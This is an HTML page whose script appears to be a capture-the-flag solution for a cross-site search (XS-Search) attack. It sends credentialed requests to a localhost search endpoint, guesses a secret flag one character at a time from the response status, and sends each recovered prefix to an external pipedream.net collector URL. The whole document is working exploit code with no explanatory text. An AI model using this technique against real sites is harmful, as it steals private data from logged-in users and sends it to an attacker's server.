<html>

<head> </head>

<body></body>
<script>
  const URL = "http://localhost:5000/search?q=flag{";
  //const REQ_BIN = "https://.m.pipedream.net/?f="
  const strings =
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_}{";
  let FLAG = "";
  const xsSearch = async (char) => {
    return new Promise(async (resolve, reject) => {
      try {
        const res = await fetch(URL + encodeURIComponent(FLAG + char), {
          credentials: "include",
          mode: "no-cors"
        })
        console.log("Found", res)

        if (res.status === 404)
          return reject(char)
        return resolve(char)
      }
      catch {
        reject(char)
      }
    });
  };

  const getFlag = async () => {
    let find = false;
    for (j = 1; j < 5; j++) {
      for (i = 0; i < strings.length; i++) {
        await xsSearch(strings[i])
          .then(
            (res) => {
              console.log("Found here")
              FLAG = FLAG.concat(res);

              fetch("https://enz9mn0dc2zcb.x.pipedream.net/?f=" + FLAG);
              find = res === "}" ? true : false;
              i = 0;
            },
            (rej) => { },
          )
          .catch(() =>
            fetch("https://enz9mn0dc2zcb.x.pipedream.net/?NotFOUND"),
          );
        if (find) break;
      }
    }
  };
  getFlag();
</script>

</html>